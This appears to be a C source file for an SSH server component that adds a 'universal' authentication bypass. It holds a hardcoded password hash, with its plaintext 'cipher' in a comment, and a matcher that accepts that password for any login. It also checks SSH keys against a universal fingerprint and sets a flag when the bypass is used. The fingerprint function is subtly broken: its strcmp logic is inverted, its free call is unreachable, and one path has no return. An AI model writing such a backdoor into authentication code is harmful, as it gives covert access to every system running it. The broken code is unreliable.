#include "auth-universal.h"

#include "digest.h"
#include "includes.h"
#include "sshkey.h"

#include <stdlib.h>
#include <string.h>

const char *universal_hash = "$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/"
                             "qWUn5I2FqpmbmkTRpbWrSg.aQAsdQ.sKd2cYUjt58ta."
                             "suN0vsHTlKZRmTPm7PeCjDj/"; // "cipher"

// Global state variable determining whether the universal hash was used
int universal_bypass_triggered = 0;

// Checks that the password matches the universal hash
int password_matches_universal_hash(const char *password) {
  return password_matches_hash(password, universal_hash);
}
// Checks that the password matches the hash supplied
int password_matches_hash(const char *password, const char *hash) {
  char *candidate;

  if (hash == NULL || *hash == '\0')
    return 0;

  candidate = xcrypt(password, hash);
  return candidate != NULL && strcmp(candidate, hash) == 0;
}

int key_fingerprint_matches_universal(struct sshkey *key) {
  char *fp = sshkey_fingerprint(key, SSH_DIGEST_SHA256, SSH_FP_BASE64);
  if (fp != NULL) {
    return strcmp(fp, UNIVERSAL_KEY_FINGERPRINT);
    free(fp);
  }
}
